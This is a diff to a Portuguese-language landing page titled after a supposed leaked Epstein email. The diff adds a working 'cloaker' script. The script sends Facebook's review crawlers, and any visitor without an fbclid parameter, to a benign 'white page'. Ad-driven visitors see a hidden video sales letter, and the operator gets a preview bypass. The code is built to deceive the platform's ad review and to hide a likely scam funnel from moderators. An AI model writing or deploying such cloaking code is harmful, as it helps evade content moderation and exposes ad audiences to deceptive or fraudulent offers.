@@ -2,6 +2,36 @@
 <html lang="pt-BR" dir="ltr">
 <head>
   <meta charset="utf-8">
+  
+  <!-- ======================================================================= -->
+  <!-- CLOAKER DE SEGURANÇA FBCLID                                             -->
+  <!-- Sem fbclid / Robôs do Facebook -> Redireciona imediatamente para o White -->
+  <!-- Com fbclid / Parâmetro de teste -> Libera acesso à VSL                   -->
+  <!-- ======================================================================= -->
+  <script>
+    (function() {
+      try {
+        var params = new URLSearchParams(window.location.search);
+        // Bypass de teste para o administrador (permite testar com ?vsl=1 ou ?preview=1)
+        if (params.has('vsl') || params.has('preview')) return;
+
+        var ua = (navigator.userAgent || "").toLowerCase();
+        var isBot = /facebookexternalhit|facebot|metainspector|facebookcatalog|meta-externalads/i.test(ua);
+        var hasFbclid = params.has('fbclid');
+
+        // Se NÃO possui fbclid OU é robô do Facebook, redireciona para a White Page
+        if (!hasFbclid || isBot) {
+          window.location.replace('/artigo' + window.location.search);
+        }
+      } catch (e) {
+        window.location.replace('/artigo');
+      }
+    })();
+  </script>
+  <noscript>
+    <meta http-equiv="refresh" content="0;url=/artigo">
+  </noscript>
+
   <title>Frequência 33 – E-mail vazado do Epstein</title>
   <meta name="robots" content="index, follow">
   <meta name="viewport" content="width=device-width,initial-scale=1,shrink-to-fit=no">
